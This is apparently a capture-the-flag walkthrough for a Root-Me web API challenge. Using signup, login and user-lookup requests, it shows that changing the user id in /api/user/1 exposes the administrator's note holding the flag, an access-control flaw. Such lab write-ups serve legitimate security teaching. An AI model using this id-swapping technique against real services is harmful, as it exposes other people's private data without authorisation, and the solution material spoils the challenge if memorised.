1. [Open the task](http://challenge01.root-me.org:59088/)
2. Register an account via GUI or Insomnia

**POST request to http://challenge01.root-me.org:59088/api/signup**

# Request body:
```
{
	"username": "YOUR_USERNAME",
	"password": "YOUR_PASSWORD"
}

```

3. Log in to your account

**POST request to http://challenge01.root-me.org:59088/api/login**

# Request body:
```
{
	"username": "YOUR_USERNAME",
	"password": "YOUR_PASSWORD"
}

```

4. Go to information about user

**GET request to http://challenge01.root-me.org:59088/api/user**

# Response body:
```
{
	"note": "",
	"userid": 2,
	"username": "YOUR_USERNAME"
}
```

5. We can conclude that the flag is in the administrator's note, and its id is 1

**GET request to http://challenge01.root-me.org:59088/api/user/1**

# Response body:
```
{
	"note": "THE FLAG WILL BE HERE",
	"userid": 1,
	"username": "admin"
}
```